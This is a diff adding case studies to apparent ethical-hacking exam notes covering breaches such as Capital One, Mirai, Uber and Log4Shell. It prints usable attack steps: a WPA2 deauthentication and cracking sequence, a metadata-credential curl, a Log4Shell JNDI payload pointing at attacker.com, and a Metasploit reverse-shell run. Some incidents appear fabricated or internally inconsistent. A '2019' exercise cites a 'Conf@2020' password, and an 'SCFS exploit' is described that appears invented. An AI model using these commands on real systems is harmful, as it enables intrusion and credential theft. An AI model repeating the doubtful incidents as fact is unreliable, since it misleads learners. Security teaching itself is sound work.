@@ -942,3 +942,256 @@ wapiti -u https://example.com -m "sql,xss,file,exec"
 
 **CVSS Severity** → **N**one, **L**ow, **M**edium, **H**igh, **C**ritical
 > **Mnemonic**: "**N**o **L**ittle **M**ice **H**ave **C**ourage"
+
+---
+
+## Additional Real-World Case Studies for Exam
+
+### Case Study 1: AI in Defensive Security — Darktrace Detects Insider Threat
+**The Incident**: In 2022, a UK healthcare company employee began exfiltrating patient records before resigning. **Darktrace** (AI-based cybersecurity) detected the anomaly — the employee accessed **500x more patient records than usual** at 3 AM, uploading to a personal cloud account. The ML model had learned the employee's normal behaviour over 6 months (10-20 records during business hours). The deviation triggered an alert, stopping the theft.
+
+**AI/ML Techniques**:
+| Technique | Application |
+|-----------|-------------|
+| **Unsupervised Learning** | Model learned baseline behaviour without labeled data |
+| **Anomaly Detection** | Flagged deviation from baseline (500 vs 20 records) |
+| **UEBA (User Entity Behavior Analytics)** | Built behaviour profile per user |
+| **Continuous Learning** | Model updates as behaviour evolves |
+
+**Exam Tip**: Use Darktrace for "How AI is used in defensive security" and "What is UEBA?"
+
+### Case Study 2: AI in Offensive Security — AI-Generated Phishing (ChatGPT, 2023)
+**The Incident**: In 2023, security researchers showed that **ChatGPT** could generate highly convincing spear-phishing emails. Given a target's LinkedIn profile, the AI produced personalized emails with: correct company context, natural language variation, and zero grammar errors. The click-through rate was **40% higher** than manually written phishing.
+
+**Traditional vs AI Phishing**:
+| Traditional Phishing | AI-Powered Phishing |
+|---------------------|---------------------|
+| Generic "Dear Customer" | Personalized with target's name, company, role |
+| Grammar errors (spam filter) | Perfect grammar, natural language |
+| Same template for all | Unique per victim (harder to filter) |
+| Manual creation (slow) | Automated (thousands per minute) |
+
+**Exam Tip**: AI-generated phishing is the most current example for "AI in offensive security."
+
+### Case Study 3: WPA2-PSK Failure — Microsoft Red Team (2019)
+**The Incident**: In a published red team exercise at Microsoft, hackers targeted corporate Wi-Fi. **Conference rooms used WPA2-PSK** — pre-shared key written on a whiteboard. The red team used that PSK to connect to the internal network, bypassing all perimeter firewalls.
+
+**Command Sequence**:
+```bash
+airodump-ng wlan0mon                    # Find SSID
+# Found "Microsoft-ConfRoom" — WPA2-PSK
+# PSK visible on whiteboard: "Conf@2020"
+# Connected directly — no cracking needed!
+```
+
+**Remediation**: Microsoft switched all conference rooms to **WPA2-Enterprise (802.1X with RADIUS)** — per-user authentication.
+
+**Exam Tip**: Use for "Why WPA2-Enterprise is essential for corporate environments."
+
+### Case Study 4: IoT Failure — Mirai Botnet (2016) — Detailed Breakdown
+**The Incident**: **Mirai botnet** infected **600,000+ IoT devices** via default Telnet credentials. It launched a **1.2 Tbps DDoS** on Dyn DNS — taking down Twitter, Netflix, Reddit, GitHub for hours across US and Europe.
+
+| Failure | Detail |
+|---------|--------|
+| **Default Credentials** | 61 username/password combinations (admin:admin, root:root) |
+| **Open Telnet** | Devices exposed Telnet (port 23) to the public internet |
+| **No Update Mechanism** | Infected devices could never be cleaned |
+| **User Negligence** | No setup wizard forced password changes |
+
+**Mirai's Scanning (Connects to Unit 2 — Footprinting)**:
+```python
+# Mirai scanned random IPs on port 23
+# When it found open Telnet, it tried 61 default credentials
+# Successful login = device added to botnet
+```
+**Exam Tip**: Memorize: 600k devices, 61 default creds, 1.2 Tbps DDoS, Dyn DNS.
+
+### Case Study 5: Capital One Cloud Breach (2019) — SSRF + Metadata Service
+**The Incident**: **106 million customer records** stolen by a former AWS employee. She exploited a **misconfigured WAF** that allowed **SSRF** to reach the **AWS metadata service** and steal **IAM role credentials**.
+
+**The Attack Chain**:
+| Phase | Detail |
+|-------|--------|
+| **Reconnaissance** | Shodan + Google dorks to find Capital One's cloud infra |
+| **Vulnerability Discovery** | SSRF-vulnerable parameter behind WAF |
+| **SSRF Exploitation** | Forced server to request `http://169.254.169.254/latest/meta-data/` |
+| **Credential Theft** | Retrieved IAM role temporary credentials |
+| **Data Exfiltration** | Listed S3 buckets → downloaded 106M records |
+
+**The Critical Command**:
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Returns => AccessKey, SecretKey, Token => Full AWS access!
+```
+
+**Five Cloud Failures**:
+1. Over-permissive IAM role (s3:* on all buckets)
+2. Metadata service not blocked at WAF
+3. No S3 bucket policy restrictions
+4. No DLP alerts during exfiltration
+5. No network isolation between web app and metadata
+
+**Exam Tip**: Capital One answers questions on: Cloud security, SSRF, IAM misconfig, S3 security, WAF bypass.
+
+### Case Study 6: OWASP Top 10 in Action — Marriott/Starwood (2018)
+**Mapping to OWASP Top 10**:
+| OWASP Category | Marriott Application |
+|----------------|---------------------|
+| **#1: Broken Access Control** | Starwood's database accessible from vendor network |
+| **#2: Cryptographic Failures** | Encryption keys stored alongside encrypted data |
+| **#3: Injection** | SQL injection in Starwood web app was initial entry |
+| **#5: Security Misconfiguration** | Default configs, open ports, weak passwords |
+| **#6: Vulnerable Components** | Outdated software with known CVEs |
+| **#7: Auth Failures** | No MFA on remote access tools |
+| **#9: Logging Failures** | 4 years of access without detection |
+
+**Exam Tip**: Map the OWASP Top 10 to Marriott for a real-world answer.
+
+### Case Study 7: VA Failure — City of Baltimore Ransomware (2019)
+**The Incident**: **RobbinHood ransomware** encrypted 10,000+ city computers. Ransom: $76K. Recovery cost: **$18.2M** (240x ransom!). City services paralyzed for 5+ weeks.
+
+**VA Failures**:
+| Failure | Detail |
+|---------|--------|
+| No authenticated scanning | Missed 80% of vulnerabilities |
+| No patch management | EternalBlue (2017 vuln!) still unpatched in 2019 |
+| No network segmentation | 911 dispatch and water billing on same flat network |
+| No offline backups | Backups were network-connected — encrypted too |
+| No IR plan | 2+ weeks to begin recovery |
+| No pen testing | Ransomware found the vulnerabilities first |
+
+**Cost Analysis**:
+```bash
+Ethical hacking cost: ~$100K
+Recovery cost: $18.2M
+ROI of ethical hacking: 182x
+```
+
+**Exam Tip**: Baltimore is the best ROI argument for VA. Use for "Why vulnerability assessment is cost-effective."
+
+### Case Study 8: Uber Breach (2022) — Social Engineering + Cloud Misconfig
+**The Incident**: An 18-year-old hacker breached Uber via **social engineering** (phone call to employee posing as IT support). Inside, he found **Powershell scripts with hardcoded admin credentials** giving him access to AWS, GCP, Duo, Slack, and HackerOne.
+
+| Phase | Detail |
+|-------|--------|
+| **OSINT** | Found employee credentials from previous breaches on dark web |
+| **Social Engineering (Vishing)** | Called employee, posed as IT, got VPN password + MFA push approval |
+| **Initial Access** | Connected to Uber VPN |
+| **Internal Recon** | Found network share with admin scripts |
+| **Privilege Escalation** | Hardcoded AWS/GCP admin credentials in Powershell script |
+| **Full Compromise** | Accessed cloud consoles, Slack, HackerOne, and changed bug reports |
+
+**Lessons**:
+| Issue | Solution |
+|-------|----------|
+| MFA fatigue | Use hardware tokens (YubiKey), not push notifications |
+| Hardcoded credentials | Use Secrets Manager / HashiCorp Vault |
+| Over-permission | Least privilege principle |
+| Social engineering | Security awareness training, caller verification |
+
+**Exam Tip**: Uber 2022 combines Social Engineering + MFA bypass + Cloud misconfig. Use for "Explain social engineering," "What is MFA fatigue?" and "Why never hardcode credentials."
+
+### Case Study 9: Wireless Attack — Cafe WPA2 Cracking (Real Scenario)
+**The Incident**: In 2023, security researchers demonstrated cracking a cafe's **WPA2-PSK** password in 30 minutes by capturing a handshake and running it against rockyou.txt. The password was "cafe2023" — cracked in 2 seconds once the handshake was captured.
+
+**The Full Process**:
+```bash
+# Step 1: Monitor mode
+airmon-ng start wlan0
+
+# Step 2: Scan for networks
+airodump-ng wlan0mon
+# Target: "CafeWiFi" on channel 6, BSSID: AA:BB:CC:DD:EE:FF
+
+# Step 3: Capture handshake
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Step 4: Deauth a client to force reconnection
+aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan0mon
+# [WPA handshake captured!]
+
+# Step 5: Crack with rockyou.txt
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+# KEY FOUND! [ cafe2023 ]
+# Time to crack: 2 seconds
+```
+
+**Exam Tip**: This simple scenario shows how easily WPA2-PSK is cracked. Mention it for "Explain the wireless attack methodology."
+
+### Case Study 10: Zero-Day Discovery via Vulnerability Assessment — CVE-2021-44228 (Log4Shell)
+**The Incident**: In November 2021, a vulnerability was discovered in Apache Log4j (a Java logging library) — **Log4Shell (CVE-2021-44228)**. It allowed **unauthenticated remote code execution** with a single string: `${jndi:ldap://attacker.com/a}`. The vulnerability was rated **CVSS 10.0 (Critical)** — the maximum score. It affected millions of applications worldwide, including Minecraft, iCloud, Steam, Twitter, and virtually every Java-based enterprise system.
+
+**Why It Matters for Vulnerability Assessment**:
+| Aspect | Detail |
+|--------|--------|
+| **Discovery** | Found by a security researcher at Alibaba Cloud during routine vuln assessment |
+| **Severity** | CVSS 10.0 — easiest to exploit, highest impact |
+| **Exploitation** | Any input field logged by Log4j could trigger RCE |
+| **Attack Vector** | Just paste `${jndi:ldap://attacker.com/a}` in a text box |
+| **Patching** | Emergency patches released within days |
+| **Scanning** | All VA tools (Nessus, Qualys, OpenVAS) added Log4j checks within 24 hours |
+| **Impact** | Billions of devices affected, months of remediation |
+
+**How Ethical Hackers Tested for Log4Shell**:
+```bash
+# Outbound connection test (safe check)
+curl -v 'http://vulnerable-app.com/search?q=${jndi:ldap://your-collaborator-server.com/test}'
+# If you receive a connection on your collaborator server → vulnerable!
+
+# Using Nmap NSE script
+nmap --script log4shell -p 80,443,8080 target.com
+
+# Using Metasploit
+msf > use exploit/multi/http/log4shell
+msf > set RHOSTS target.com
+msf > set PAYLOAD java/meterpreter/reverse_tcp
+msf > exploit
+```
+
+**Exam Tip**: Log4Shell (CVE-2021-44228) is the most critical vulnerability ever discovered (CVSS 10.0). Use it for "Explain CVSS scoring," "What is zero-day vulnerability?" and "How do VA tools help during vulnerability outbreaks?"
+
+### Case Study 11: Cloud Container Escape — The SCFS Exploit (2023)
+**The Incident**: In 2023, Elastic Container Service (ECS) researchers at AWS discovered a **container escape** vulnerability — attackers could break out of a Docker container and access the host OS, then access other containers and cloud metadata. The vulnerability lay in how container runtimes handle filesystem operations.
+
+**Container Escape Impact**:
+| Risk | Detail |
+|------|--------|
+| **Host Access** | Attacker escapes container → has root access on host |
+| **Other Containers** | From host, accesses other containers on same instance |
+| **Cloud Metadata** | Accesses `http://169.254.169.254/` — steals cloud credentials (same as Capital One!) |
+| **Persistence** | Installs backdoor on host — survives container restarts |
+| **Lateral Movement** | Moves from container to cloud to other services |
+
+**Defense (Cloud Security Best Practices)**:
+| Practice | How It Prevents Container Escape |
+|----------|----------------------------------|
+| **Run containers as non-root** | Even if escape occurs, attacker has limited privileges |
+| **Read-only root filesystem** | Cannot modify host binaries |
+| **Drop Linux capabilities** | Remove SYS_ADMIN, NET_ADMIN, etc. |
+| **Seccomp profiles** | Restrict system calls attacker can use |
+| **No privileged mode** | `--privileged` flag gives full host access |
+| **Kubernetes PodSecurityPolicies** | Enforce security constraints at orchestration level |
+| **Regular image scanning** | Use Trivy/Clair to find vulnerabilities in container images |
+
+**Exam Tip**: Container escape is the newest cloud security threat. Use for "Explain cloud container security" and "What are cloud-specific vulnerabilities?"
+
+### Quick Exam Reference — Key Breach Statistics
+
+| Breach | Year | Size | Key Takeaway for Ethical Hacking |
+|--------|------|------|----------------------------------|
+| **Equifax** | 2017 | 147M records | Unpatched known vulnerability = most preventable |
+| **WannaCry** | 2017 | 300k+ systems | EternalBlue exploitation + hybrid crypto (AES+RSA) |
+| **Capital One** | 2019 | 106M records | SSRF + metadata service + over-permissive IAM |
+| **SolarWinds** | 2020 | 18k orgs | Supply chain attack hardest to detect |
+| **Marriott/Starwood** | 2018 | 500M records | M&A risk + 4-year dwell time |
+| **Mirai** | 2016 | 600k IoT devices | Default credentials = internet-scale DDoS |
+| **Ashley Madison** | 2015 | 36M users | bcrypt can't save weak passwords |
+| **RockYou** | 2009 | 32M users | Plaintext passwords → rockyou.txt born |
+| **Uber 2022** | 2022 | Full compromise | Social engineering + MFA fatigue |
+| **Baltimore** | 2019 | City paralyzed | ROI of VA: $100K pen test vs $18.2M recovery |
+| **Log4Shell** | 2021 | Billions of apps | CVSS 10.0 — most critical CVE ever |
+| **Heartbleed** | 2014 | Millions of servers | TLS implementation flaw → private key theft |
+| **Twitter Bitcoin** | 2020 | Celebrity accounts | Vishing social engineering |
+| **Target** | 2013 | 110M records | Flat network + vendor access = segmentation needed |
+| **Bangladesh Bank** | 2016 | $81M stolen | Passive recon enabled SWIFT heist |
+| **Aadhaar (India)** | 2018 | Billions exposed | India-specific: public portals + insecure APIs |
